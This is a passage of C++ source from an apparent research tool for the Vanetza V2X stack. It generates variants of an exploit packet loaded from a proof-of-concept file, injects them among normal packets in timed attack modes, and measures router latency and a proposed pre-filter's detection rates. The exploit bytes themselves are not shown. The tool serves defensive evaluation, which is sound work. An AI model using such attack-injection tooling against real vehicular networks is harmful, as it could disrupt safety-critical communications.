            writeBufferToFile(path, candidate);
            generated++;

            if (generated % 50 == 0 || generated == DATASET_TARGET) {
                fprintf(stdout, "\r[+] Generated: %d/%d  |  Rejected: %d  |  Lat: %lld ns  ",
                        generated, DATASET_TARGET, rejected, variant_latency);
                fflush(stdout);
            }
        } else {
            rejected++;
        }
    }

    std::cout << "\n";
    if (generated < DATASET_TARGET) {
        std::cout << "[!] Warning: only generated " << generated << "/" << DATASET_TARGET
                  << " packets after " << attempts << " attempts.\n";
        return generated > 0;
    }

    std::cout << GREEN << "[+] Dataset complete: " << generated << " attack packets saved to "
              << ATTACK_FOLDER << RESET << "/\n";
    std::cout << RED << "[+] Vanetza rejection rate during generation: "
              << (rejected * 100.0 / attempts) << "%" << RESET << "\n";
    return true;
}

// ================================================
// Help
// ================================================

void printHelp(const char* progName) {
    std::cout << "Usage: " << progName << " [-t total] [-p pollution_rate] [-m mode] [-f] [--build-dataset]\n"
              << "  -t               Total packets (Default: 1000000)\n"
              << "  -p               Pollution rate 0~100 (Default: 5.0)\n"
              << "  -m               Attack Mode:\n"
              << "                     0 = Uniform Random\n"
              << "                     1 = Single Pulse (30~50% window)\n"
              << "                     2 = Periodic On-Off (5 attack waves)\n"
              << "  -f               Enable Proposed Fast Pre-Filter\n"
              << "  --build-dataset  Generate and validate attack packet dataset\n"
              << "  --profile-amp    Run MTU-constrained amplification profiling\n"
              << "  --diagnose-flood Run flood region parse contribution test\n";
}

// ================================================
// Log record
// ================================================

struct LogRecord {
    int      id;
    int      is_malware;
    int      was_dropped;
    long long latency;
};

// ================================================
// Main
// ================================================

int main(int argc, char* argv[]) {
    int    total_packets  = 1000000;
    double pollution_rate = 5.0;
    int    attack_mode    = 0;
    bool   enable_filter  = false;
    bool   build_dataset  = false;
    bool   profile_amp = false;
    bool   diagnose_flood = false;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if      (arg == "-h")              { printHelp(argv[0]); return 0; }
        else if (arg == "--build-dataset")   build_dataset  = true;
        else if (arg == "--profile-amp")     profile_amp = true;
        else if (arg == "--diagnose-flood")  diagnose_flood = true;
        else if (arg == "-f")                enable_filter  = true;
        else if (arg == "-t" && i+1 < argc)  total_packets  = std::atoi(argv[++i]);
        else if (arg == "-p" && i+1 < argc)  pollution_rate = std::atof(argv[++i]);
        else if (arg == "-m" && i+1 < argc)  attack_mode    = std::atoi(argv[++i]);
    }

    // Load base normal packet
    vanetza::ByteBuffer base_normal;
    {
        auto normals = loadPacketsFromFolder(NORMAL_FOLDER);
        if (normals.empty()) {
            std::cerr << "[-] Error: No normal packets found in " << NORMAL_FOLDER << "/\n";
            return 1;
        }
        base_normal = normals[0];
        std::cout << "[*] Loaded base normal packet: " << base_normal.size() << " bytes\n";
    }

    // Load the real exploit as base for variant generation
    vanetza::ByteBuffer poc_packet = readFileIntoBuffer("input-malware/poc_mtu_limit.bin");
    if (poc_packet.empty()) {
        std::cerr << "[-] poc_mtu_limit.bin missing\n";
        return 1;
    }

    if (profile_amp) {
        runAmplificationProfiling(poc_packet);
        return 0;
    }

    if (diagnose_flood) {
        runFloodDiagnosis(poc_packet);
        return 0;
    }

    if (build_dataset) {
        // Clean old wrong variants first
        bool ok = buildAttackDataset(base_normal, poc_packet);
        return ok ? 0 : 1;
    }

    // ---- Simulation mode ----

    // Load attack dataset from folder
    std::vector<vanetza::ByteBuffer> attack_packets = loadPacketsFromFolder(ATTACK_FOLDER);
    if (attack_packets.empty()) {
        std::cerr << "[-] No attack packets found in " << ATTACK_FOLDER << "/\n";
        std::cerr << "[-] Run with --build-dataset first.\n";
        return 1;
    }
    std::cout << "[*] Loaded " << attack_packets.size() << " attack packet variants from "
              << ATTACK_FOLDER << "/\n";

    // Load all normal packets
    std::vector<vanetza::ByteBuffer> normal_packets = loadPacketsFromFolder(NORMAL_FOLDER);
    std::cout << "[*] Loaded " << normal_packets.size() << " normal packet variants from "
              << NORMAL_FOLDER << "/\n";

    // Pre-roll random sequence outside timing window
    std::vector<unsigned int> sequence(total_packets);
    for (int i = 0; i < total_packets; ++i) {
        sequence[i] = static_cast<unsigned int>(rand());
    }

    // Output CSV filename
    char out_filename[128];
    if (pollution_rate == 0.0) {
        snprintf(out_filename, sizeof(out_filename), "csv_data/qos_baseline.csv");
    } else if (enable_filter) {
        snprintf(out_filename, sizeof(out_filename),
                 "csv_data/qos_attack_%.1f_mode%d_filtered.csv", pollution_rate, attack_mode);
    } else {
        snprintf(out_filename, sizeof(out_filename),
                 "csv_data/qos_attack_%.1f_mode%d.csv", pollution_rate, attack_mode);
    }

    std::cout << "[*] Mode: " << attack_mode
              << " | Rate: " << pollution_rate
              << "% | Filter: " << (enable_filter ? "ON" : "OFF") << "\n";
    std::cout << "[*] Starting QoS Measurement...\n";

    AdaptiveFilterFSM filter_fsm;
    vanetza::RouterFuzzingContext context;
    mkdir("csv_data", 0755);

    int true_positives  = 0;
    int false_positives = 0;
    int true_negatives  = 0;
    int false_negatives = 0;

    int mode1_start  = total_packets * 0.3;
    int mode1_end    = total_packets * 0.5;
    int mode2_period = total_packets / 10;

    std::vector<LogRecord> logs;
    logs.reserve(total_packets);

    // Progress tracking
    int    print_interval  = total_packets / 20;   // print every 5%
    int    malware_so_far  = 0;

    for (int i = 0; i < total_packets; ++i) {

        // Progress print
        if (i % print_interval == 0 || i == total_packets - 1) {
            fprintf(stdout, "\r[*] Progress: %d/%d  |  Malware injected: %d  |  %.1f%%     ",
                    i, total_packets, malware_so_far,
                    100.0 * i / total_packets);
            fflush(stdout);
        }

        // Determine if this packet is malicious
        bool is_malware = false;
        if (attack_mode == 0) {
            is_malware = (sequence[i] % 100) < static_cast<unsigned int>(pollution_rate);
        } else if (attack_mode == 1) {
            if (i >= mode1_start && i <= mode1_end)
                is_malware = (sequence[i] % 100) < static_cast<unsigned int>(pollution_rate);
        } else if (attack_mode == 2) {
            int current_cycle = i / mode2_period;
            if (current_cycle % 2 == 1)
                is_malware = (sequence[i] % 100) < static_cast<unsigned int>(pollution_rate);
        }

        if (is_malware) malware_so_far++;

        // Select packet buffer from pre-validated dataset
        const vanetza::ByteBuffer& buf = is_malware
            ? attack_packets [sequence[i] % attack_packets.size()]
            : normal_packets [sequence[i] % normal_packets.size()];

        // ---- Timing window start ----
        auto start = std::chrono::high_resolution_clock::now();

        bool drop_packet = false;
        if (enable_filter) {
            drop_packet = filter_fsm.process_packet(buf);
        }

        if (drop_packet) {
            if (is_malware) true_positives++;
            else            false_positives++;
        } else {
            if (is_malware) false_negatives++;
            else            true_negatives++;

            vanetza::ByteBuffer buf_copy = buf;
            context.indicate(std::move(buf_copy));
        }

        auto end = std::chrono::high_resolution_clock::now();
        // ---- Timing window end ----

        long long latency_ns = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
        logs.push_back({i, is_malware ? 1 : 0, drop_packet ? 1 : 0, latency_ns});

        // ── DEBUG: flag any filter spike exceeding unpatched baseline ──────
        // if (enable_filter && latency_ns > 300000) {
        //     fprintf(stderr, "[WARN] Packet %d: latency=%lldns state=%d "
        //                     "budget=%.2f streak=%d size=%zu\n",
        //             i, latency_ns, (int)filter_fsm.get_state(),
        //             filter_fsm.current_budget,
        //             filter_fsm.clean_streak,
        //             buf.size());
        // }
    }

    std::cout << "\n[*] Simulation complete. Writing data to disk...\n";

    std::ofstream csv_out(out_filename);
    csv_out << "packet_id,is_malware,was_dropped,latency_ns\n";
    for (const auto& log : logs) {
        csv_out << log.id << "," << log.is_malware << ","
                << log.was_dropped << "," << log.latency << "\n";
    }
    csv_out.close();

    if (enable_filter) {
        double total_attacks = true_positives  + false_negatives;
        double total_normal  = true_negatives  + false_positives;

        std::cout << "\n========================================\n";
        std::cout << "      FILTER FSM SECURITY REPORT\n";
        std::cout << "========================================\n";
        std::cout << "Total Packets Processed : " << total_packets           << "\n";
        std::cout << "Total Malware Injected  : " << malware_so_far          << "\n";
        std::cout << "True Positives (Blocked): " << true_positives          << " (Good!)\n";
        std::cout << "True Negatives (Passed) : " << true_negatives          << " (Good!)\n";
        std::cout << "False Positives (Dropped normal) : " << false_positives << " (BAD - Self DoS)\n";
        std::cout << "False Negatives (Missed attack)  : " << false_negatives << " (BAD - Latency Risk)\n";
        if (total_normal  > 0)
            std::cout << "False Positive Rate (FPR) : "
                      << (false_positives / total_normal)  * 100.0 << "%\n";
        if (total_attacks > 0)
            std::cout << "False Negative Rate (FNR) : "
                      << (false_negatives / total_attacks) * 100.0 << "%\n";
        std::cout << "========================================\n";
    }

    std::cout << GREEN << "[+] Saved to " << out_filename << RESET << "\n";
    return 0;
}